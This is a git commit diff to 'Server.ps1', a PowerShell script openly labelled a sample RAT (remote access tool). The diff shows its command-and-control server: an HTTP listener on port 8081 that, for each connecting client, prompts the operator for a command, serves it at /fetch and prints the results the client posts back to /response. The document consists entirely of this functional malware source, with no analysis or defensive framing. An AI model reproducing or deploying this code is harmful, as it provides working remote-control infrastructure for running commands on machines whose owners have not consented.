4d7e1443bb19a2e62e2ca573f24a9948110d2a24
infosecsmith <infosecsmith@gmail.com>
2014-06-04 15:15:44 -0600

    Update Server.ps1

--- Server.ps1
+++ Server.ps1
@@ -1,62 +1,38 @@
 # Sample PowerShell RAT
+# Casey Smith
+# 06-04-2014
 # 
-# .\server.ps1
-# Listening ...
-# <Waits for Client to Connect>
-# Whats your order?: idle
-# Whats your order?: cmd
-# Whats your command?: Get-Process
-# Start Server - Then execute client
-# TODO - Make one script...
-
-
-
-
 
 function Receive-Request {
-   param(
-      
+   param(      
       $Request
    )
    $output = ""
-
-   
-      $size = $Request.ContentLength64 + 1
-      
+   $size = $Request.ContentLength64 + 1   
    $buffer = New-Object byte[] $size
    do {
       $count = $Request.InputStream.Read($buffer, 0, $size)
       $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
    } until($count -lt $size)
-
    $Request.InputStream.Close()
    write-host $output
 }
 
 $listener = New-Object System.Net.HttpListener
-$listener.Prefixes.Add('http://+:8080/') 
-
+$listener.Prefixes.Add('http://+:8081/') 
 $listener.Start()
 'Listening ...'
 while ($true) {
     $context = $listener.GetContext() # blocks until request is received
     $request = $context.Request
     $response = $context.Response
-    
+	$hostip = $request.RemoteEndPoint
     if ($request.Url -match '/fetch$' ) { # 
         $response.ContentType = 'text/plain'
-        $message = Read-Host 'Whats your order?'
-			if($message -eq 'cmd')
-				{
-					$message = Read-Host 'Whats your command?'
-					
-				}
-    }
-	
-		
+        $message = Read-Host "PS $hostip>"		
+    }		
     if ($request.Url -match '/response$' -and ($request.HttpMethod -eq "POST") ) { 
-		Receive-Request($request)
-		
+		Receive-Request($request)	
 	}
 
     [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
